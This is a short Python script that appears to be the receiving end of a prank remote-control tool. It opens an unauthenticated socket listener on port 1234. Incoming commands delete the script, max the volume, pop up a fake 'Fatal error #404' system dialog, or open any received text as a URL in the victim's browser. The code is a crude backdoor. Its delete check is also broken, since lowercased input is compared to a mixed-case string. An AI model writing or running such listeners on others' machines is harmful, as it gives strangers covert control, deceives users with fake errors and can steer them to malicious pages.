import socket
import webbrowser
from sound import Sound
import tkinter
from tkinter import messagebox
import os

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((socket.gethostbyname_ex(socket.gethostname())[-1][-1], 1234))

server.listen()

while True:
    user, adres = server.accept()

    while True:
        data = user.recv(1024).decode("utf-8").lower()
        if data == 'DELETE-exe':
            os.remove('host.py')
        elif data == 'volume-max':
            Sound.volume_max()
        elif data == 'error':
            tkinter.messagebox.showerror("System", "Fatal error #404")
        else:
            webbrowser.open(data)
        
